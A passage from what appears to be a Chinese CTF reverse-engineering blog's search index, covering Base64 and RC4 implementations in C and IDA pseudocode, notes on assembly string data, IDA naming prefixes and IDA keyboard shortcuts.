number">1</span><span class="token punctuation">]</span> <span class="token operator">&amp;</span> <span class="token number">0xF</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>a1<span class="token punctuation">[</span>v9 <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">>></span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>          v4 <span class="token operator">=</span> v11 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>            v10 <span class="token operator">=</span> v11 <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">;</span>            <span class="token comment">// 第四个：a1[2]取后6位作为索引，查找对应字符  </span>        src<span class="token punctuation">[</span>v4<span class="token punctuation">]</span> <span class="token operator">=</span> base64_table<span class="token punctuation">[</span>a1<span class="token punctuation">[</span>v9 <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">&amp;</span> <span class="token number">0x3F</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            v9 <span class="token operator">+=</span> <span class="token number">3</span><span class="token punctuation">;</span>            <span class="token operator">++</span>v8<span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span> v14 <span class="token operator">==</span> <span class="token number">1</span> <span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>    <span class="token comment">// 余数为1，则需要添加两个等号    </span>        src<span class="token punctuation">[</span>v10<span class="token punctuation">]</span> <span class="token operator">=</span> base64_table<span class="token punctuation">[</span>a1<span class="token punctuation">[</span>v9<span class="token punctuation">]</span> <span class="token operator">>></span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            src<span class="token punctuation">[</span>v10 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> base64_table<span class="token punctuation">[</span><span class="token number">16</span> <span class="token operator">*</span> <span class="token punctuation">(</span>a1<span class="token punctuation">[</span>v9<span class="token punctuation">]</span> <span class="token operator">&amp;</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token function">strcat</span><span class="token punctuation">(</span>src<span class="token punctuation">,</span> <span class="token string">"=="</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span> v14 <span class="token operator">==</span> <span class="token number">2</span> <span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>   <span class="token comment">// 余数为2，则需要添加1个等号      </span>        v5 <span class="token operator">=</span> v10<span class="token punctuation">;</span>            v12 <span class="token operator">=</span> v10 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>            src<span class="token punctuation">[</span>v5<span class="token punctuation">]</span> <span class="token operator">=</span> base64_table<span class="token punctuation">[</span>a1<span class="token punctuation">[</span>v9<span class="token punctuation">]</span> <span class="token operator">>></span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            v6 <span class="token operator">=</span> v12<span class="token operator">++</span><span class="token punctuation">;</span>            src<span class="token punctuation">[</span>v6<span class="token punctuation">]</span> <span class="token operator">=</span> base64_table<span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token number">16</span> <span class="token operator">*</span> <span class="token punctuation">(</span>a1<span class="token punctuation">[</span>v9<span class="token punctuation">]</span> <span class="token operator">&amp;</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>a1<span class="token punctuation">[</span>v9 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">>></span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            src<span class="token punctuation">[</span>v12<span class="token punctuation">]</span> <span class="token operator">=</span> base64_table<span class="token punctuation">[</span><span class="token number">4</span> <span class="token operator">*</span> <span class="token punctuation">(</span>a1<span class="token punctuation">[</span>v9 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">&amp;</span> <span class="token number">0xF</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            src<span class="token punctuation">[</span>v12 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token char">'='</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>      <span class="token function">strcpy</span><span class="token punctuation">(</span>a1<span class="token punctuation">,</span> src<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> a1<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="RC4"><a href="#RC4" class="headerlink" title="RC4"></a>RC4</h2><blockquote><p>RC4 是对称加密算法，通过密钥 key 和 S盒生成密钥流，明文逐字节异或 S盒，同时 S盒也会发生改变<br>加密与解密使用了相同的函数和密钥 K，加密的强度主要来源于密钥的安全性，密钥泄露能直接解密出明文</p><p><mark>【相关 Writeup 见 攻防世界-crypt、攻防世界-ereere】</mark></p></blockquote><hr><h3 id="特点-1"><a href="#特点-1" class="headerlink" title="特点"></a>特点</h3><ol><li>RC4 加密算法属于流加密算法，包括<strong>初始化函数</strong>和<strong>加解密函数</strong></li><li><strong>初始化函数</strong>中有两个 256循环，第一个循环给 s 盒初始化为 0 - 255，第二个循环根据密钥 key 对 s 盒 swap</li><li><strong>加解密函数</strong>中有一个 256循环，使明文和 s 盒异或生成密文</li></ol><hr><h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><h4 id="初始化部分"><a href="#初始化部分" class="headerlink" title="初始化部分"></a>初始化部分</h4><ul><li>初始化长度为 256 的 S 盒。第一个 for 循环将 0 到 255 的互不重复的元素装入 S 盒；第二个 for 循环根据密钥 key 打乱 S 盒，i 确保 S-box 的每个元素都得到处理，j 保证 S-box 的搅乱是随机的</li><li>不同的 S-box 在经过伪随机子密码生成算法的处理后可以得到不同的子密钥序列，将 S-box 和明文进行 xor 运算，得到密文，解密过程也完全相同</li></ul><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">void</span> <span class="token function">rc4_init</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span> <span class="token operator">*</span>s<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">char</span> <span class="token operator">*</span>key<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">long</span> Len<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> k<span class="token punctuation">[</span><span class="token number">256</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">0</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token comment">//临时向量 k</span>    <span class="token keyword">unsigned</span> <span class="token keyword">char</span> tmp <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">256</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        s<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> i<span class="token punctuation">;</span>        k<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> key<span class="token punctuation">[</span>i <span class="token operator">%</span> Len<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token comment">//Len = strlen(key)，密钥的长度</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">256</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">//打乱s表</span>        j <span class="token operator">=</span> <span class="token punctuation">(</span>j <span class="token operator">+</span> s<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> k<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span><span class="token punctuation">;</span>        tmp <span class="token operator">=</span> s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>        s<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> s<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token comment">//交换s[i]和s[j]</span>        s<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> tmp<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="加解密部分"><a href="#加解密部分" class="headerlink" title="加解密部分"></a>加解密部分</h4><ul><li>每收到一个字节，就进行循环。通过一定的算法定位 S 盒中的一个元素，并与输入字节异或，得到 k；同时，循环中还改变了 S 盒</li><li>如果输入的是明文，输出的就是密文；如果输入的是密文，输出的就是明文</li></ul><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">void</span> <span class="token function">rc4_crypt</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span> <span class="token operator">*</span>s<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">char</span> <span class="token operator">*</span>Data<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">long</span> Len<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> t <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">unsigned</span> <span class="token keyword">long</span> k <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">unsigned</span> <span class="token keyword">char</span> tmp<span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>k <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> k <span class="token operator">&lt;</span> Len<span class="token punctuation">;</span> k<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token comment">//Len = strlen(key)，密钥的长度</span>    <span class="token punctuation">&#123;</span>        i <span class="token operator">=</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span><span class="token punctuation">;</span>        j <span class="token operator">=</span> <span class="token punctuation">(</span>j <span class="token operator">+</span> s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span><span class="token punctuation">;</span>        tmp <span class="token operator">=</span> s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>        s<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> s<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token comment">//交换s[i]和s[j]</span>        s<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> tmp<span class="token punctuation">;</span>        t <span class="token operator">=</span> <span class="token punctuation">(</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> s<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span><span class="token punctuation">;</span>        Data<span class="token punctuation">[</span>k<span class="token punctuation">]</span> <span class="token operator">^=</span> s<span class="token punctuation">[</span>t<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h3 id="示例-1"><a href="#示例-1" class="headerlink" title="示例"></a>示例</h3><pre class="line-numbers language-c" data-language="c"><code class="language-c">__int64 __fastcall <span class="token function">rc4_init</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span>a1<span class="token punctuation">,</span> __int64 a2<span class="token punctuation">,</span> <span class="token keyword">int</span> a3<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  __int64 result<span class="token punctuation">;</span> <span class="token comment">// rax</span>  <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment">// [rsp+0h] [rbp-28h]</span>  <span class="token keyword">int</span> j<span class="token punctuation">;</span> <span class="token comment">// [rsp+0h] [rbp-28h]</span>  <span class="token keyword">int</span> v6<span class="token punctuation">;</span> <span class="token comment">// [rsp+4h] [rbp-24h]</span>  <span class="token keyword">int</span> v7<span class="token punctuation">;</span> <span class="token comment">// [rsp+8h] [rbp-20h]</span>  <span class="token keyword">int</span> v8<span class="token punctuation">;</span> <span class="token comment">// [rsp+Ch] [rbp-1Ch]</span>  _DWORD <span class="token operator">*</span>v9<span class="token punctuation">;</span> <span class="token comment">// [rsp+10h] [rbp-18h]</span>  <span class="token operator">*</span>a1 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  a1<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  v9 <span class="token operator">=</span> a1 <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">256</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>    v9<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> i<span class="token punctuation">;</span>    <span class="token comment">//循环给 s 盒赋值</span>  v6 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  result <span class="token operator">=</span> <span class="token number">0</span>i64<span class="token punctuation">;</span>  <span class="token function">LOBYTE</span><span class="token punctuation">(</span>v7<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> <span class="token number">256</span><span class="token punctuation">;</span> <span class="token operator">++</span>j <span class="token punctuation">)</span>    <span class="token comment">//循环根据密钥 key 对 s 盒进行 swap</span>  <span class="token punctuation">&#123;</span>    <span class="token comment">//Ⅰ、Ⅱ、Ⅲ 交换v9[j]和v9[v7]的值</span>    v8 <span class="token operator">=</span> v9<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token comment">//Ⅰ</span>    v7 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>a2 <span class="token operator">+</span> v6<span class="token punctuation">)</span> <span class="token operator">+</span> v8 <span class="token operator">+</span> v7<span class="token punctuation">)</span><span class="token punctuation">;</span>    v9<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> v9<span class="token punctuation">[</span>v7<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token comment">//Ⅱ</span>    v9<span class="token punctuation">[</span>v7<span class="token punctuation">]</span> <span class="token operator">=</span> v8<span class="token punctuation">;</span>    <span class="token comment">//Ⅲ</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">++</span>v6 <span class="token operator">>=</span> a3 <span class="token punctuation">)</span>      v6 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    result <span class="token operator">=</span> <span class="token punctuation">(</span>j <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> result<span class="token punctuation">;</span><span class="token punctuation">&#125;</span>_DWORD <span class="token operator">*</span>__fastcall <span class="token function">rc4_crypt</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span>a1<span class="token punctuation">,</span> __int64 a2<span class="token punctuation">,</span> <span class="token keyword">int</span> a3<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  _DWORD <span class="token operator">*</span>result<span class="token punctuation">;</span> <span class="token comment">// rax</span>  <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment">// [rsp+0h] [rbp-28h]</span>  <span class="token keyword">int</span> v5<span class="token punctuation">;</span> <span class="token comment">// [rsp+4h] [rbp-24h]</span>  <span class="token keyword">int</span> v6<span class="token punctuation">;</span> <span class="token comment">// [rsp+8h] [rbp-20h]</span>  <span class="token keyword">int</span> v7<span class="token punctuation">;</span> <span class="token comment">// [rsp+Ch] [rbp-1Ch]</span>  <span class="token keyword">int</span> v8<span class="token punctuation">;</span> <span class="token comment">// [rsp+10h] [rbp-18h]</span>  _DWORD <span class="token operator">*</span>v9<span class="token punctuation">;</span> <span class="token comment">// [rsp+18h] [rbp-10h]</span>  v5 <span class="token operator">=</span> <span class="token operator">*</span>a1<span class="token punctuation">;</span>  v6 <span class="token operator">=</span> a1<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  v9 <span class="token operator">=</span> a1 <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> a3<span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token comment">//Ⅰ、Ⅱ、Ⅲ、Ⅳ 交换v9[v5]和v9[v6]的值</span>    v5 <span class="token operator">=</span> <span class="token punctuation">(</span>v5 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//Ⅰ</span>    v7 <span class="token operator">=</span> v9<span class="token punctuation">[</span>v5<span class="token punctuation">]</span><span class="token punctuation">;</span>    v6 <span class="token operator">=</span> <span class="token punctuation">(</span>v7 <span class="token operator">+</span> v6<span class="token punctuation">)</span><span class="token punctuation">;</span>    v8 <span class="token operator">=</span> v9<span class="token punctuation">[</span>v6<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token comment">//Ⅱ</span>    v9<span class="token punctuation">[</span>v5<span class="token punctuation">]</span> <span class="token operator">=</span> v8<span class="token punctuation">;</span>    <span class="token comment">//Ⅲ</span>    v9<span class="token punctuation">[</span>v6<span class="token punctuation">]</span> <span class="token operator">=</span> v7<span class="token punctuation">;</span>    <span class="token comment">//Ⅳ</span>    <span class="token operator">*</span><span class="token punctuation">(</span>a2 <span class="token operator">+</span> i<span class="token punctuation">)</span> <span class="token operator">^=</span> <span class="token function">LOBYTE</span><span class="token punctuation">(</span>v9<span class="token punctuation">[</span><span class="token punctuation">(</span>v8 <span class="token operator">+</span> v7<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token operator">*</span>a1 <span class="token operator">=</span> v5<span class="token punctuation">;</span>  result <span class="token operator">=</span> a1<span class="token punctuation">;</span>  a1<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> v6<span class="token punctuation">;</span>  <span class="token keyword">return</span> result<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr>]]></content>
      
      
      <categories>
          
          <category> IDA </category>
          
      </categories>
      
      
        <tags>
            
            <tag> REVERSE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>汇编知识</title>
      <link href="/2023/03/17/CTF%20-%20Reverse/IDA/%E6%B1%87%E7%BC%96%E7%9F%A5%E8%AF%86/"/>
      <url>/2023/03/17/CTF%20-%20Reverse/IDA/%E6%B1%87%E7%BC%96%E7%9F%A5%E8%AF%86/</url>
      
        <content type="html"><![CDATA[<h2 id="在字符串最后，用“0”表示结束"><a href="#在字符串最后，用“0”表示结束" class="headerlink" title="在字符串最后，用“0”表示结束"></a>在字符串最后，用“0”表示结束</h2><ul><li><strong>Format 的内容：”Welcome The System\nPlease Input Key:”</strong></li></ul><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token punctuation">.</span>rdata<span class="token operator">:</span><span class="token number">00402100</span> <span class="token number">57</span> <span class="token number">65</span> <span class="token number">6</span>C <span class="token number">63</span> <span class="token number">6F</span> <span class="token number">6</span>D <span class="token number">65</span> <span class="token number">20</span> <span class="token number">54</span> <span class="token number">68</span><span class="token operator">+</span> Format db <span class="token char">'Welcome The System'</span> <span class="token punctuation">,</span> <span class="token number">0</span>Ah <span class="token punctuation">;</span>     DATA XREF<span class="token operator">:</span> _main<span class="token operator">+</span><span class="token number">28</span>↑o<span class="token punctuation">.</span>rdata<span class="token operator">:</span><span class="token number">00402100</span> <span class="token number">65</span> <span class="token number">20</span> <span class="token number">53</span> <span class="token number">79</span> <span class="token number">73</span> <span class="token number">74</span> <span class="token number">65</span> <span class="token number">6</span>D <span class="token number">0</span>A <span class="token number">50</span><span class="token operator">+</span> db <span class="token char">'Please Input Key:'</span> <span class="token punctuation">,</span> <span class="token number">0</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ul><li><strong>byte_402150 的内容：<code>2a49f69c38395cde96d6de96d6f4e025484954d6195448def6e2dad67786e21d5adae6</code><br>byte_402151 的内容：<code>a49f69c38395cde96d6de96d6f4e025484954d6195448def6e2dad67786e21d5adae6</code></strong></li></ul><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token punctuation">.</span>rdata<span class="token operator">:</span><span class="token number">00402150</span> <span class="token punctuation">;</span> <span class="token keyword">char</span> byte_402150<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span>rdata<span class="token operator">:</span><span class="token number">00402150</span> <span class="token number">32</span> byte_402150 db <span class="token char">'2'</span> <span class="token punctuation">;</span>      DATA XREF<span class="token operator">:</span> sub_401090<span class="token operator">:</span>loc_4010CC↑r<span class="token punctuation">.</span>rdata<span class="token operator">:</span><span class="token number">00402151</span> <span class="token punctuation">;</span> <span class="token keyword">char</span> byte_402151<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span>rdata<span class="token operator">:</span><span class="token number">00402151</span> <span class="token number">61</span> byte_402151 db <span class="token char">'a'</span> <span class="token punctuation">;</span>      DATA XREF<span class="token operator">:</span> sub_401090<span class="token operator">:</span>loc_4010E9↑r<span class="token punctuation">.</span>rdata<span class="token operator">:</span><span class="token number">00402152</span> <span class="token number">34</span> <span class="token number">39</span> <span class="token number">66</span> <span class="token number">36</span> <span class="token number">39</span> <span class="token number">63</span> <span class="token number">33</span> <span class="token number">38</span> <span class="token number">33</span> <span class="token number">39</span><span class="token operator">+</span>a49f69c38395cde db '<span class="token number">49f</span><span class="token number">69</span>c38395cde96d6de96d6f4e025484954d6195448def6e2dad67786e21d5adae6' <span class="token punctuation">,</span> <span class="token number">0</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="定义字符串时，用-dup-开辟未初始化的空间"><a href="#定义字符串时，用-dup-开辟未初始化的空间" class="headerlink" title="定义字符串时，用 dup(?) 开辟未初始化的空间"></a>定义字符串时，用 <code>dup(?)</code> 开辟未初始化的空间</h2><p><img src="https://s2.loli.net/2023/03/17/r6BYOSP5G7vDb8A.png" alt="CTF - Reverse_IDA——汇编知识1.png"></p><ul><li><strong><code>str2 db 68h dup(?)</code> 是指开辟一个 68h 长度的空间，且不进行初始化</strong></li></ul>]]></content>
      
      
      <categories>
          
          <category> IDA </category>
          
      </categories>
      
      
        <tags>
            
            <tag> REVERSE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IDA命名前缀的含义</title>
      <link href="/2023/03/17/CTF%20-%20Reverse/IDA/IDA%E5%91%BD%E5%90%8D%E5%89%8D%E7%BC%80%E7%9A%84%E5%90%AB%E4%B9%89/"/>
      <url>/2023/03/17/CTF%20-%20Reverse/IDA/IDA%E5%91%BD%E5%90%8D%E5%89%8D%E7%BC%80%E7%9A%84%E5%90%AB%E4%B9%89/</url>
      
        <content type="html"><![CDATA[<h2 id="IDA-命名前缀的含义"><a href="#IDA-命名前缀的含义" class="headerlink" title="IDA 命名前缀的含义"></a>IDA 命名前缀的含义</h2><blockquote><p>IDA 会自动生成假名字，用于表示子函数、程序地址和数据，根据不同的类型和值，假名字有不同的前缀</p></blockquote><hr><table><thead><tr><th>前缀</th><th>意义</th></tr></thead><tbody><tr><td><strong>sub_</strong></td><td>指令和子函数起点</td></tr><tr><td>locret_</td><td>返回指令</td></tr><tr><td><strong>loc_</strong></td><td>指令</td></tr><tr><td><strong>off_</strong></td><td>数据，包含偏移量</td></tr><tr><td><strong>seg_</strong></td><td>数据，包含段地址值</td></tr><tr><td>asc_</td><td>数据，ASCII字符串</td></tr><tr><td><strong>byte_</strong></td><td>数据，字节（或字节数组）</td></tr><tr><td><strong>word_</strong></td><td>数据，16位数据（或字数组）</td></tr><tr><td><strong>dword_</strong></td><td>数据，32位数据（或双字数组）</td></tr><tr><td><strong>qword_</strong></td><td>数据，64位数据（或4字数组）</td></tr><tr><td>flt_</td><td>浮点数据，32位（或浮点数组）</td></tr><tr><td>dbl_</td><td>浮点数，64位（或双精度数组）</td></tr><tr><td>tbyte_</td><td>浮点数，80位（或扩展精度浮点数）</td></tr><tr><td>stru_</td><td>结构体(或结构体数组)</td></tr><tr><td>algn_</td><td>对齐指示</td></tr><tr><td><strong>unk_</strong></td><td>未处理字节</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> IDA </category>
          
      </categories>
      
      
        <tags>
            
            <tag> REVERSE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IDA快捷键</title>
      <link href="/2023/03/17/CTF%20-%20Reverse/IDA/IDA%E5%BF%AB%E6%8D%B7%E9%94%AE/"/>
      <url>/2023/03/17/CTF%20-%20Reverse/IDA/IDA%E5%BF%AB%E6%8D%B7%E9%94%AE/</url>
      
        <content type="html"><![CDATA[<table><thead><tr><th>作用</th><th>快捷键</th></tr></thead><tbody><tr><td><strong>查看字符串</strong></td><td>Shift + F12</td></tr><tr><td><strong>反汇编</strong></td><td>F5</td></tr><tr><td><strong>快速查看16进制数的ASCii码对应的字符</strong></td><td>r</td></tr><tr><td><strong>在反汇编后的界面中写下注释</strong></td><td>；</td></tr><tr><td><strong>在反编译后伪代码的界面中写下注释</strong></td><td>&#x2F;</td></tr><tr><td><strong>查看、隐藏变量的类型</strong></td><td>\</td></tr><tr><td><strong>对着某个函数、变量按该快捷键，查看它的交叉引用</strong></td><td>x</td></tr><tr><td><strong>直接跳转到某个地址</strong></td><td>g</td></tr><tr><td><strong>更改变量的名称</strong></td><td>n</td></tr><tr><td><strong>拍摄IDA快照</strong></td><td>ctrl + shift + w</td></tr><tr><td><strong>嵌入脚本</strong></td><td>shift + F2</td></tr><tr><td><strong>文本搜索字符串</strong></td><td>alt + t</td></tr><tr><td><strong>将数据转换为16 进制</strong></td><td>h</td></tr><tr><td><strong>获取数组的数据</strong></td><td>shift + e</td></tr><tr><td><strong>对数据db&#x2F;dw&#x2F;dd之间进行切换</strong></td><td>d</td></tr><tr><td><strong>转化为函数</strong></td><td>p</td></tr><tr><td><strong>将数据转化为代码</strong></td><td>c</td></tr><tr><td><strong>将数据转化为字符串</strong></td><td>a</td></tr><tr><td><strong>将代码转换为数据</strong></td><td>u</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> IDA </category>
          
      </categories>
      
      
        <tags>
            
            <tag> REVERSE </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
